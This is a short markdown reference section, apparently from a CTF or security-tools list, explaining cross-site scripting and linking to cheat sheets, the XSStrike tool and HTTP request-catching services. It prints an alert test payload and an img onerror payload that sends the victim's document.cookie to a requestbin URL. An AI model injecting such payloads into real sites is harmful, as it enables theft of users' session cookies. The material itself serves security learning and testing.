The **XSS** vulnerability occurs when a user can control the content of a web page. A malicious code can be used to steal cookies of authentified users, redirect the user to a malicious site, or even execute arbitrary code on the user's machine.

* [XSS]/[Cross-site scripting]

	[XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet). [Cross-site scripting], vulnerability where the user can control rendered [HTML](https://en.wikipedia.org/wiki/HTML) and ideally inject [JavaScript](https://en.wikipedia.org/wiki/JavaScript) code that could drive a browser to any other website or make any malicious network calls. Example test payload is as follows:


```
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
```

	Typically you use this to steal cookies or other information, and you can do this with an online requestbin.

```
<img src="#" onerror="document.location='http://requestbin.fullcontact.com/168r30u1?c' + document.cookie">
```
* new usefull XSS cheat sheet : 'https://portswigger.net/web-security/cross-site-scripting/cheat-sheet'

* [XSStrike](https://github.com/UltimateHackers/XSStrike) 
	A command-line tool for automated [XSS](https://en.wikipedia.org/wiki/Cross-site_scripting) attacks. Seems to function like how [sqlmap](https://github.com/sqlmapproject/sqlmap) does.

* [`requestb.in`](https://requestb.in/)

	A free tool and online end-point that can be used to catch HTTP requests. Typically these are controlled and set by finding a [XSS](https://en.wikipedia.org/wiki/Cross-site_scripting) vulnerabilty.

* [`hookbin.com`](https://hookbin.com/)

	A free tool and online end-point that can be used to catch HTTP requests. Typically these are controlled and set by finding a [XSS](https://en.wikipedia.org/wiki/Cross-site_scripting) vulnerabilty.